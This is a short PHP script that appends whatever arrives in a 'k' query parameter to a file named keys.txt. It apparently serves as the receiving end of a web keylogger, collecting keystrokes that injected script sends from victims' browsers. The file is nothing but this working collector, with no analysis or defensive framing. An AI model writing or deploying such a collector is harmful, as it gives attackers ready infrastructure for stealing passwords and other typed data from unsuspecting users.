<?php
	 if(!empty($_GET['k'])) {
		 $file = fopen('keys.txt', 'a');
		 fwrite($file, $_GET['k']);
		 fclose($file);
	 }
?>

